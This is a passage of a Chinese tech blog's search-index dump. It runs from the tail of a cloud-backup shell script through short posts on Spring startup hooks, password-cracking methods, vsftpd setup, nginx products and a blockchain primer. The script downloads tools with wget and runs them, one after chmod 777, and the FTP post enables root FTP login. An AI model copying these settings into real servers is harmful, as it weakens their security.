&quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/&quot;$backuptime&quot;.tar.gz &quot;$&#123;backup_filelist[&quot;$msnb&quot;]&#125;&quot; &gt;&gt;/dev/null 2&gt;&amp;1 rm -rf &quot;$&#123;backup_filelist[&quot;$msnb&quot;]&#125;&quot;/$backuptime.sqlelse echo &quot;开始压缩文件... ...&quot; tar -czvf &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/&quot;$backuptime&quot;.tar.gz &quot;$&#123;backup_filelist[&quot;$msnb&quot;]&#125;&quot; &gt;&gt;/dev/null 2&gt;&amp;1 rm -rf &quot;$&#123;backup_filelist[&quot;$msnb&quot;]&#125;&quot;/$backuptime.sql.gzfi#数据库备份开始#数据库备份结束donefi#多站点压缩结束#腾讯云开始if [ &quot;$enable&quot; == tengxun ];then if [ -z &quot;$txbucketname&quot; ] &amp;&amp; [ -z &quot;$txaccess_id&quot; ] &amp;&amp; [ -z &quot;$txappid&quot; ] &amp;&amp; [ -z &quot;$txsecret_key&quot; ] &amp;&amp; [ -z &quot;$txregion&quot; ];then echo &quot;腾讯云配置检查失败&quot; exit 1 fi#检查coscmd环境 if [ -f /bin/coscmd ];then echo &quot;coscmd检测完毕&quot; else echo &quot;coscmd检测失败，开始安装.&quot;#检查pip环境if [ -f /bin/pip ];then echo &quot;pip检测完毕&quot;else echo &quot;pip检测失败，开始安装.&quot; yum install -y python-pip pip install --upgrade pipfi#检查pip环境结束 git clone https://github.com/tencentyun/coscmd.git cd coscmd &amp;&amp; python setup.py install fi#检查coscmd环境结束#检查./.cos.conf环境开始 if [ -f ~/.cos.conf ];then echo &quot;cos.conf检测完毕&quot; rm -rf ~/.cos.conf coscmd config -a &quot;$txappid&quot; -s &quot;$txsecret_key&quot; -b &quot;$txbucketname&quot; -r &quot;$txregion&quot; else echo &quot;cos.conf检测失败,开始安装.&quot; coscmd config -a &quot;$txappid&quot; -s &quot;$txsecret_key&quot; -b &quot;$txbucketname&quot; -r &quot;$txregion&quot; fi#检查./.cos.conf环境结求#上传开始 if [ &quot;$multistation&quot; == no ];then coscmd upload -r /itxg/&quot;$backuptime&quot;.tar.gz &quot;$backuptime&quot;.tar.gz &gt;/dev/null 2&gt;&amp;1# if [ &quot;$?&quot; -eq 0 ];then# echo &quot;腾讯云上传完成&quot;# elif [ &quot;$?&quot; -eq 255 ];then# echo &quot;腾讯云上传完成&quot;# else # echo &quot;腾讯云上传失败&quot;# fi fi if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do coscmd upload -r &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/&quot;$backuptime&quot;.tar.gz &quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz &gt;/dev/null# if [ &quot;$?&quot; -eq 0 ];then# echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传完成&quot;# elif [ &quot;$?&quot; -eq 255 ];then# echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传完成&quot;# else# echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传失败&quot;# fi done fi#上传结束#腾讯云删除开始 if [ ! -z &quot;$rmdate&quot; ];then if [ &quot;$multistation&quot; == no ];then coscmd delete -f &quot;$rmbackuptime&quot;.tar.gz &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;腾讯云&quot;$txbucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;腾讯云&quot;$txbucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; else echo &quot;腾讯云&quot;$txbucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除失败&quot; fi fi if [ &quot;$multistation&quot; == yes ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do coscmd delete -f &quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; else echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除失败&quot; fi done fi else echo &quot;备份周期为永久，请注意COS存储使用情况...&quot; fi#腾讯云删除结束fi#阿里云开始if [ &quot;$enable&quot; == aliyun ];then if [ -z &quot;$albucketname&quot; ] &amp;&amp; [ -z &quot;$alaccess_key_id&quot; ] &amp;&amp; [ -z &quot;$alaccess_key_secret&quot; ] &amp;&amp; [ -z &quot;$alendpoint&quot; ];then echo &quot;阿里云配置失败&quot; exit 1 fi if [ ! -f ./ossutil64 ];then wget http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/attach/50452/cn_zh/1506525299111/ossutil64?spm=5176.doc50452.2.3.7XHxTz mv ossutil64?spm=5176.doc50452.2.3.7XHxTz ossutil64 chmod 777 ossutil64 fi#阿里云配置检查 if [ -f .ossutilconfig ];then echo &quot;ossutil配置检测完毕&quot; rm -rf `pwd`/.ossutilconfig `pwd`/./ossutil64 config -e &quot;$alendpoint&quot; -i &quot;$alaccess_key_id&quot; -k &quot;$alaccess_key_secret&quot; -L EN else echo &quot;ossutil配置检测失败,开始配置&quot; `pwd`/./ossutil64 config -e &quot;$alendpoint&quot; -i &quot;$alaccess_key_id&quot; -k &quot;$alaccess_key_secret&quot; -L EN fi#阿里云配置检查结束#阿里云上传开始 if [ &quot;$multistation&quot; == no ];then `pwd`/./ossutil64 cp -f /itxg/&quot;$backuptime&quot;.tar.gz oss://&quot;$albucketname&quot; if [ &quot;$?&quot; -eq 0 ];then echo &quot;阿里云&quot;$backuptime&quot;.tar.gz上传完成&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;阿里云&quot;$backuptime&quot;.tar.gz上传完成&quot; else echo &quot;阿里云&quot;$backuptime&quot;.tar.gz上传失败&quot; fi fi if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do `pwd`/./ossutil64 cp -f &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/&quot;$backuptime&quot;.tar.gz oss://&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/ &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传完成&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传完成&quot; else echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传失败&quot; fi done fi#阿里云上传结束#阿里云删除开始if [ ! -z &quot;$rmdate&quot; ];then if [ &quot;$multistation&quot; == no ];then `pwd`/./ossutil64 rm oss://&quot;$albucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; else echo &quot;阿里云&quot;$albucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除失败&quot; fi fi if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do `pwd`/./ossutil64 rm oss://&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; else echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除失败&quot; fi done fielse echo &quot;备份周期为永久，请注意OSS存储使用情况...&quot; fifi#阿里云删除结束#七牛云开始#判断是否是七牛云上传if [ &quot;$enable&quot; == qiniu ];then if [ -z &quot;$qnak&quot; ] &amp;&amp; [ -z &quot;$qnsk&quot; ] &amp;&amp; [ -z &quot;$qiniubucket&quot; ];then echo &quot;七牛云配置检查失败&quot; exit 1 fi if [ ! -f ./qshell-linux-x64 ];then wget https://dn-devtools.qbox.me/2.1.5/qshell-linux-x64 &gt;/dev/null 2&gt;&amp;1 chmod 755 qshell-linux-x64 echo &quot;七牛云安装完成&quot; fi./qshell-linux-x64 account &quot;$qnak&quot; &quot;$qnsk&quot; echo &quot;开始上传...&quot;./qshell-linux-x64 rput &quot;$qiniubucket&quot; &quot;$backuptime&quot;.tar.gz /itxg/&quot;$backuptime&quot;.tar.gz if [ &quot;$?&quot; -eq 0 ];then echo &quot;七牛云上传完成&quot; else echo &quot;七牛云上传失败&quot; fi#七牛云删除开始 if [ ! -z &quot;$rmdate&quot; ];then ./qshell-linux-x64 delete &quot;$qiniubacket&quot; &quot;$rmbackuptime&quot;.tar.gz &gt; /dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;七牛云删除结束&quot; else echo &quot;七牛云删除失败&quot; fi else echo &quot;备份周期为永久，请注意七牛存储使用情况...&quot; fifi]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring 容器启动执行]]></title>
    <url>%2F2018%2F08%2F06%2Fexception%2Fexception-3%2F</url>
    <content type="text"><![CDATA[问题背景：容器启动执行后立刻执行改代码 、常用来初始化redis数据、等等 方法一 spring扫描执行PostConstruct注解方法 spring.xml 12&lt;context:component-scan base-package="com.csdn.uc.init"/&gt; 123456789101112131415161718192021222324252627/** * 容器启动后加载redis * Created by huoyan403 on 3/22/2017. */@Componentpublic class AddressToRedisInit&#123; private static final Logger logger = LoggerFactory.getLogger(AddressToRedisInit.class); @Autowired private AreasDao areasDao; @Autowired private RedisClient redisClient;// 启动开关// @PostConstruct public void AddressToRedisInit() &#123; //子线程执行初始化 AddressToRedisThread addressToRedisThread = new AddressToRedisThread(); addressToRedisThread.setRedisClient(redisClient); addressToRedisThread.setAreasDao(areasDao); addressToRedisThread.run(); &#125;&#125; 方法二 springboot实现 CommandLineRunner 接口 123456789101112131415161718192021222324252627282930 /** * description * 启动后执行 规划每个doc文档存储设置 * @author lishengkai * @date 2018-03-28 16:47 */@Componentpublic class InitDocIndexSetting implements CommandLineRunner &#123; @Autowired ElasticsearchTemplate elasticsearchOperations; @Autowired BeanPostProcessor beanPostProcessor; @Override public void run(String... args) throws Exception &#123; Map&lt;String, Object&gt; map = beanPostProcessor.map; for (Object o : map.values()) &#123; elasticsearchOperations.createIndexWithSettings(o.getClass()); &#125; &#125;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>exception</category>
      </categories>
      <tags>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破解密码常见的几种方式]]></title>
    <url>%2F2018%2F07%2F13%2Fencryption%2Fpassword-cracked%2F</url>
    <content type="text"><![CDATA[暴力穷举使用字典生成常用密码序列进行密码尝试 击键记录使用密码病毒获取输入工具点击操作 屏幕记录使用密码病毒获取屏幕点击记录 网络钓鱼使用伪造站点获取用户密码 嗅探器【sniffer】使用网络监听工具获取获取网络消息 {———-} 系统漏洞使用系统漏洞进行shell操作、然后在进行以上获取密码操作、 如：键盘、屏幕工具录入、或者文件下载、直接查看文件密码等 远程攻击分为两种：远程入侵和破坏性攻击 远程获取目标主机shell 进行监控、文件download等 dos、ddos、等等 不良习惯多网站使用同一密码 使用简单密码 使用常用单词、 长期不更换密码 绕过破解常见：拦截cookie、session攻击等 密码心理学社会工程学破解密码 简单来讲就是、站在对方的角度上去设置密码、然后猜解密码、 一个密码会跟人生经历有很大关系、 一个人也不会用没碰到过的、没见过的东西作为密码 举几个例子： 某公司密码 可能是 公司大写或者小写+当年年份 某家路由器密码可能是：他或者他老婆姓名【姓氏】+生日、或者常见数字 破结果一个wifi 跑字典出来是 11121314 12131415 你觉得很安全 谁会想到我这么个序列作为密码、其实字典就是一个小时的功夫]]></content>
      <categories>
        <category>java</category>
        <category>password</category>
      </categories>
      <tags>
        <tag>密码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hash环、一致性hash]]></title>
    <url>%2F2018%2F07%2F10%2Fessay%2Fhash%2F</url>
    <content type="text"><![CDATA[hash环、一致性hash Hash环 上面说的Hash函数，只经过了1次hash，即把key hash到对应的机器编号。而Hash环有2次Hash： （1）把所有机器编号hash到这个环上 （2）把key也hash到这个环上。然后在这个环上进行匹配，看这个key和哪台机器匹配。 具体来讲，如下： 假定有这样一个Hash函数，其值空间为（0到2的32次方-1) ，也就是说，其hash值是个32位无整型数字 ，这些数字组成一个环。 然后，先对机器进行hash(比如根据机器的ip)，算出每台机器在这个环上的位置； 再对key进行hash，算出该key在环上的位置， 然后从这个位置往前走，遇到的第一台机器就是该key对应的机器，就把该(key, value) 存储到该机器上。 首先计算出每台Cache服务器在环上的位置（图中的大圆圈）；然后每来一个(key, value)，计算出在环上的位置（图中的小圆圈）， 然后顺时针走，遇到的第1个机器，就是其要存储的机器。 这里的关键点是：当你增加/减少机器时，其他机器在环上的位置并不会发生改变。这样只有增加的那台机器、 或者减少的那台机器附近的数据会失效，其他机器上的数据都还是有效的。 {———-} 数据倾斜问题 当你机器不多的时候，很可能出现几台机器在环上面贴的很近，不是在环上均匀分布。这将会导致大部分数据，都会集中在某1台机器上。 为了解决这个问题，可以引入“虚拟机器”的概念，也就是说：1台机器，我在环上面计算出多个位置。 怎么弄呢？ 假设用机器的ip来hash，我可以在ip后面加上几个编号, ip_1, ip_2, ip_3, .. 把1台物理机器生个多个虚拟机器的编号。 数据首先映射到“虚拟机器上”，再从“虚拟机器”映射到物理机器上。 因为虚拟机器可以很多，在环上面均匀分布，从而保证数据均匀分布到物理机器上面。 ZK的引入 上面我们提到了服务器的机器增加、减少，问题是客户端怎么知道呢？ 一种笨办法就是手动的，当服务器机器增加、减少时候，重新配置客户端，重启客户端。 另外一种，就是引入ZK，服务器的节点列表注册到ZK上面，客户端监听ZK。发现结点数发生变化，自动更新自己的配置。 当然，不用ZK，用一个其他的中心结点，只要能实现这种更改的通知，也是可以的。]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随便写点]]></title>
    <url>%2F2018%2F07%2F06%2Fessay%2Fessay-2%2F</url>
    <content type="text"><![CDATA[spring cloud 刚刚上了生产 service mesh、事件驱动架构、来了 rest刚刚成为普遍api规范 GraphQL来了 更NB的是 Netflix 停止维护了eureka、出了个 “混沌工程” {———-}大公司的技术就像是生产苹果的、小公司的技术就是跟着屁股后头捡捡苹果核儿、、、 大公司吃完了苹果、吃核桃、换着花样吃、小公司跟后头就吃各种核儿、、哈哈、所以一定要进大公司耍耍去、若能玩顶尖的技术、岂不妙哉？ infoq地址 技术更迭的真快、现在还有精力去学习、以后也就看看虎形而已了、 谁说程序员的工资好挣的、一不留神就失业没人要的工作、惶惶度日、不会学习的程序员就是温水的青蛙、安乐死…]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ftp部署]]></title>
    <url>%2F2018%2F07%2F04%2Fservice-deploy%2Fftp%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637381、首先服务器要安装ftp软件,查看是否已经安装ftp软件下： #which vsftpd 如果看到有vsftpd的目录说明服务器已经安装了ftp软件2、查看ftp 服务器状态 #service vsftpd status3、如果没有安装，查询是否有可用的rpm安装包[root@centos ~]# yum list |grep vsftpdvsftpd.i686 2.2.2-21.el6 base4、安装vsftpd服务[root@centos ~]# yum install -y vsftpd5. 启动ftp服务器 #service vsftpd start6. 重启ftp服务器 #service vsftpd restart7. 查看服务有没有启动 [root@centos ~]# netstat -lnp tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN 1491/vsftpd 如果看到以上信息，证明ftp服务已经开启。8.如果需要开启root用户的ftp权限要修改以下两个文件 #vi /etc/vsftpd/ftpusers中注释掉root #vi /etc/vsftpd/user_list中也注释掉root 然后重新启动ftp服务[root@centos ~]# service vsftpd restart]]></content>
      <categories>
        <category>java</category>
        <category>service-deploy</category>
      </categories>
      <tags>
        <tag>服务搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx-plus]]></title>
    <url>%2F2018%2F07%2F03%2Fload-balance%2Fnginx-plus%2F</url>
    <content type="text"><![CDATA[好用软件推荐简化部署、多云环境更容易发现服务的故障结合nginx-controller非常好用软件官方网站-nginx-plus 简介 NGINX Plus是一个基于开源NGINX构建的软件负载均衡器，Web服务器和内容缓存。 NGINX Plus在开源产品的基础上提供独家的生产就绪功能，包括会话持久性，通过API配置和主动健康检查。 使用NGINX Plus代替硬件负载均衡器，获得创新的自由，而不受基础设施的限制。 功能{———-} 负载均衡器 使用软件扩展传统的负载平衡： HTTP，TCP和UDP负载平衡 使用URI，cookie，args等进行第7层请求路由 基于cookie的会话持久性* 状态代码和响应正文的主动运行状况检查* 使用DNS *进行服务发现 内容缓存 使用为世界上最大的CDN提供支持的相同缓存： 缓存静态和动态内容 通过微处理提高动态内容性能 在后台重新验证时提供“陈旧”内容以提高性能 覆盖或设置Cache‑Control标题 使用缓存清除API轻松管理缓存* 网络服务器 以无与伦比的速度和效率交付静态资产： 同时处理数十万客户 使用比其他Web服务器少90％的内存 反向代理多个协议：HTTP，gRPC，Memcached，PHP-FPM，SCGI，uwsgi 流HTTP视频：FLV，HDS，HLS，MP4 支持HTTP / 2服务器推送的HTTP / 2网关 安全控制 保护您的应用： 请求/连接限制 双栈RSA / ECC SSL卸载 IP访问控制列表（ACL） API和OpenID Connect单点登录（SSO）的JWT身份验证* NGINX WAF动态模块* 动态模块 动态插入其他功能： 用于JavaScript配置的nginScript模块 GeoIP模块按IP地址定位用户（需要MaxMind GeoIP数据库） 用于编译自己的自定义模块的构建工具 单点登录模块：ForgeRock，IDF Connect和Ping Identity * 动态模块库* 监控 诊断和调试复杂的应用程序体系结构： 使用NGINX Amplify监控NGINX指标并验证配置 适用于AppDynamics，Datadog，Dynatrace和New Relic的插件 具有超过90个唯一指标的扩展状态* 内置实时图形仪表板* 用于与自定义监视工具集成的JSON和HTML输出* 高可用性（HA） 可扩展且可靠的HA部署： 主动 - 主动和主动 - 被动HA模式 群集中服务器之间的配置同步 使用内置脚本轻松安装 状态共享Sticky Learn会话持久性 Kubernetes Ingress控制器 使用NGINX Plus创建Kubernetes应用程序： 具有SSL / TLS终止的负载平衡 WebSocket和HTTP / 2支持 请求之前的URI重写被转发到应用程序 会话持久性* JWT认证* 可编程 动态部署自定义体系结构： 用于脚本和高级配置的NGINX JavaScript模块 Lua脚本语言 Ansible，Chef和Puppet集成 用于管理上游服务器，键值存储和实时指标的API * 无需重新加载的动态重新配置* 流媒体 Scalably提供流媒体： 直播：RTMP，Apple HTTP直播（HLS），HTTP上的动态自适应流媒体（DASH） 视频点播：Flash（flv），MP4 自适应比特率VOD：HLS，Adobe HTTP动态流（HDS）* MP4流媒体的带宽控制*]]></content>
      <categories>
        <category>java</category>
        <category>load-balance</category>
      </categories>
      <tags>
        <tag>项目推荐</tag>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx-controller]]></title>
    <url>%2F2018%2F07%2F03%2Fload-balance%2Fnginx-controller%2F</url>
    <content type="text"><![CDATA[好用软件推荐nginx-plus监控官方网站-nginx-controller 密码加密 图谱 简介 NGINX Controller是所有NGINX Plus实例的集中管理平台。 使用Controller，您可以在多云环境中轻松管理多个NGINX Plus服务器。 使用直观的向导样式界面，您可以创建NGINX Plus的新实例，并集中配置负载平衡，URL路由和SSL终止等功能。 Controller具有丰富的监控和警报功能，有助于确保应用程序的可用性，性能和可靠性。 Controller基于最佳实践提供对200个关键指标和抢先推荐的深入可见性，使ITOps和DevOps团队能够首先避免性能问题，并解决可能出现的任何问题。 {———-} 功能实时监控和警报 获得关于应用程序性能的重要见解： 关键指标的图表，例如每秒请求数，活动连接数，带宽使用情况 根据预定义的阈值提醒100多个指标，如CPU使用率，400/500错误和运行状况检查失败 使用REST API轻松集成您选择的任何监控工具 仪表板 使用以下命令快速监控NGINX plus实例并对其进行故障排除： 概述仪表板，用于汇总负载均衡器中的指标 应用程序健康评分，用于衡量成功请求和及时响应 可自定义的仪表板，用于监控特定于您的环境的指标 先发制人的建议 使用内置配置分析器获取： 基于成千上万客户的学习，增强了性能和安全性 通过遵循内置的最佳实践来获得更好的SLA。 抢先和可行的建议： 组态 安全 SSL状态 简化的配置管理 导航一个简单直观的向导式用户界面，用于： NGINX Plus配置的指导工作流程 负载平衡器的按钮部署 流量路由到上游服务器 SSL密钥和证书管理 政策驱动的管理 通过开发多个特定于环境的策略来加速应用程序部署。创建配置环境： 分期 生产 具体业务范围]]></content>
      <categories>
        <category>java</category>
        <category>load-balance</category>
      </categories>
      <tags>
        <tag>项目推荐</tag>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于编码方式]]></title>
    <url>%2F2018%2F07%2F03%2Fessay%2Fessay-11%2F</url>
    <content type="text"><![CDATA[编码 将人类语言解释为机器语言的一种关系映射 常见编码方式 ASCII 128个 0-31控制字符、换行、删除、回车 32-126打印字符 ISO8859-1 在ASCII上 加上了大多数修语言字符、256个字符 {———-}GB2312 信息交换用汉字编码字符集基本集、双字节编码、 A1-A9 符号区 B0-F7 汉字区 GBK 汉字内码扩展规范 对GB2312扩展 编码范围 8140-FEFE 与GB2312兼容 GB18030 数字交换用汉字编码字符集 单字节、双字节、四字节、与GB2312兼容 UTF-16 Unicode字符集的存取方法 使用2字节标识Unicode转化格式、定长表示 UTF-8 边长字符集、1-6个字节 涵盖了所有各国字符编码 UTF-8mb4 在UTF8基础上 增加了表情字符]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链 概述、开源]]></title>
    <url>%2F2018%2F07%2F03%2Fblock-chain%2Fblock-chain-3%2F</url>
    <content type="text"><![CDATA[开源地址 前言这是区块链相关知识的一个梳理，旨在真正的get the skill并方便他人。 知识可分为两类: 逻辑体系型的 需要思考，把各种概念连起来，或归纳，或演绎，最后，在大脑中形成一种逻辑网状结构。比如可计算理论，分布式系统，解释器等。 使用操作型的 基本不需要思考，只需要看一下目录，要用的时候参考一下手册即可。比如linux的各种命令，go,python的一些奇怪语法,elastic-search dsl的使用。 第一类知识是比较有意思的，值得多花时间，这种”逻辑网状结构”最后会形成一个”打通”的集群，可能会让你的大脑产生一些有意思的想法；而第二类，千万别花太多时间，因为很有可能让你产生消极，厌学，忧郁等情绪，而你越努力，就越可能”斯德哥尔摩”。 区块链知识可以归为第一类。 研究一个东西，需要知道它包含哪些概念，我把它分为两类: {———-} 自描述概念 不依赖其他概念的概念 他描述概念 需要依赖其他概念的概念 显然，这是一个递归的概念，可以用形式化的语言来描述，你也可以哲学的扯一大堆，但这不是我的兴趣。 下面的章节试图用原理，逻辑，应用的方式把区块链相关的概念连起来，形成”网状结构“，所有概念可在Glossary(词汇表)里查看，你可以先浏览一下，想一想他们之间的关系，再来看下面的章节。当然，最后，每个人的”网状结构”可能都不同，毕竟除了”同一性”，还有”差异性”。但，原则是一致的，有了”网状结构”，在添加新的”概念”时，我们就可以审视其在”网”中的位置，也可以思考这张”网”还缺少什么，有什么不完美之处，是不是还有”孤岛”等问题，进而有可能去完善它。 而所有的学习，无非就是完善那张网，并尽可能的正交。 这样，垃圾少了，人也轻松了。 原理1. KV(key value) There are only two hard things in Computer Science: cache invalidation and naming things. – Phil Karlton 为什么名字那么重要？因为有了名字，这个名字才能够被引用，才能够谈论其属性。 就是说，你要谈论一个人，首先得有这个人，这有点废话，但却是原理性的， 名字意味着什么？ 图灵机里面的head,没错，只有你找到head,才知道当前的(input,state),才能往下走。 汇编语言如果没有address,存储和操作也没法进行;各种编程语言的变量说的也是这个事情。 而kv中的k其实就是名字，v在不同的场合可以有不同的含义。 有了kv,就可以构造所有的数据结构，因为从递归的角度，v也可以是kv。 这个跟blockchain有关系吗？ 2. Asset(资产)在digital asset的世界，address上的数字就是资产。显然，address是key,数字是value。理解这一点很重要，blockchain主要主要的应用场景就是数字资产。 不太精确的分类: 资产数字化 相当于一个凭证，其有现实的对应物，比如股票，其实对应公司的投票分红等权利。 数字资产化 没有现实的对应物，但是可以换成现实中的钱，比如比特币。 3. Transaction(交易)而address上的数字的变更，也就是kv的变化，对应着资产的转移，就是交易(transaction)。 如果能把所有KV的变化按顺序记录起来，就达到了可溯源的目的，这跟kafka里面的stream和table的关系是一样的。 可以看出，我们可以根据交易记录，来得到目前每个地址的资产；而资产的变化必须以目前的资产为前提。 事实上，这个保证是consensus mechanism(共识机制)里面的一个检查点。 4. Currency issuance(货币发行)那么资产从哪里来呢？ 上帝说，要有光就有了光。 这里我们不去讨论历史，只从现实的货币发行制度以及比特币”怼”的方式阐述。 4.1 美元的发行流程 没钱花了，国会和总统授权财政部,发行国债 国债大部分卖给中国和日本，有钱了 又没钱花了，中国日本也不要，通过银行卖给美联储，有钱了，这个钱是凭空出来的，Currency issuance(货币发行) works 债券是有利率的，就是说偿还债务时需要比借的钱要多一些 而发行的钱=借出的钱，这多一些的钱从哪里来呢？ 唯一的办法就是继续借，也就是继续发行，否则这个系统就没法运转下去 这个系统的必然结果是: inflation(通货膨胀) 在经济增长对货币需求量增加的情况下，债务只可能越来越大 但是，只要有信心，这个系统就可以一直运行下去 并且，似乎其还有一个作用，生产力高的人更容易获得金钱 因为如果你赚的钱如果不足以覆盖你使用钱的成本，你就会被淘汰 这个系统不完美，但支撑了资本主义的高速发展 似乎繁荣,萧条的周期跟这个系统有很大的关系 它还在高速运转 4.2 比特币的发行流程比特币的创世区块，上面有一句话: “The Times 03/Jan/2009 Chancellor on brink of second bailout for banks”“财政大臣站在第二次救助银行的边缘” 这句话是当天泰晤士报头版的标题。中本聪将它写进创世区块，不但清晰地展示着比特币的诞生时间，还表达着对旧体系的嘲讽。 银行家的贪婪，政府的监守自盗，大而不倒的把戏，已经有太多的批评，这里不再赘述。 试验性质的比特币，试图回答两个问题: 谁该拥有货币发行权 货币发行量由什么决定 比特币的答案是: 众生平等，你有我有全都有 货币发行量预期固定，每4年减半 这里有太多话题性的东西: 依靠算力真的能做到去中心化？公平？民主？ 指数衰减的货币真的有利于经济发展？ 这种越早加入网络越容易拥有更多资产的机制是传销吗? 这些东西都可以去讨论。 从技术的角度，这里对应着数据的记录和计算的机制，在 distributed network(分布式网络) 的环境下，就是所谓的 consensus mechanism(共识机制)。 5. Distributed network(分布式网络)一群人 合作 来 搞事情，就形成了网络。 这里的人叫node(节点),搞事情的过程中，一个不行了，另一个顶上，就叫failover。 常见的搞事情，比如LB,replica storage等。 这里的合作遵循的规则就叫 consensus mechanism(共识机制)。 如果这群人都很聪明，并且互相信任，事情会简单很多。 很多的系统都是以此为假设进行设计的。 区块链的假设是:节点之间是互相不信任的。 区块链要干的事情就是:设计一个能让互相不信任的节点都信任的机制,然后大家可以愉快的一起搞事情。 6. Consensus mechanism(共识机制)在跟资产相关的世界里，这个机制需要做到: 确保某个address的数字只能由拥有它的人来操作 交易记录无法篡改 交易记录可追溯 比特币也是围绕这几个问题展开的，当然它还干了其他几件牛B的事情: 在去中心化的条件下解决spend twice的问题 防止通货膨胀的货币发行机制 完全的去中心化对区块链来说并不是一个必选项，就大部分的商业活动看，去中心化反而会增加很多不必要的复杂性。 发币也不是必选项。 我们先来看如何做到确保某个address的数字只能由拥有它的人来操作，交易记录无法篡改，交易记录可追溯 7. Cryptography(密码学)7.1 Asymmetric cryptography(非对称加密) 公钥加密，只有对应的私钥能够解密 加密货币中的address对应公钥(bitcoin的实现里面，为了隐藏身份，对public key做了hash),对该address的资产进行操作的唯一条件是:拥有对应的私钥。 